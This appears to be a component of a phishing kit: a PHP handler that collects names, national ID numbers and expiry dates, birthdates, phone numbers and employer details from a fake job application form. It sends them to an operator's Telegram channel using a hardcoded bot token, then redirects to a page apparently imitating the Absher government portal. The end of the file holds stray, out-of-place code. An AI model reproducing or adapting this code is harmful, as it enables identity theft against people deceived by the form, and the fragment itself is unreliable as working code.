<?php

function sendTelegramMessage($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $payload = array(
        "chat_id" => $chatId,
        "text" => $message,
        "parse_mode" => "HTML"
    );
    $options = array(
        "http" => array(
            "method" => "POST",
            "header" => "Content-Type: application/json",
            "content" => json_encode($payload)
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return json_decode($result, true);
}

// Extracted data from the form
$data = array(
    "name" => $_POST['name'],
    "id_card" => $_POST['id_card'],
    "id_card_expiry" => $_POST['id_card_expiry'],
    "birthdate" => $_POST['birthdate'],
    "mobile" => $_POST['mobile'],
    "employer" => $_POST['employer'],
    "job_title" => $_POST['job_title'],
    "area" => $_POST['area']
);

// Format the extracted data into a message
$message = "<b>New job application:</b>\n\n";
foreach ($data as $key => $value) {
    $message .= "<b>{$key}:</b> {$value}\n";
}

// Telegram Bot API credentials
$token = "6873405246:AAEUAS4DF970H6qcFBFQeC4L_N8W4wbjetc";
$chatId = "@moamlat4";

// Send the message to Telegram
$response = sendTelegramMessage($token, $chatId, $message);
print_r($response);

?>


<script>
  function goToNextPage() {window.location.href = "absher.php";}
</script>






// Test the function
$token = "6873405246:AAEUAS4DF970H6qcFBFQeC4L_N8W4wbjetc";
$chatId = "@moamlat4";
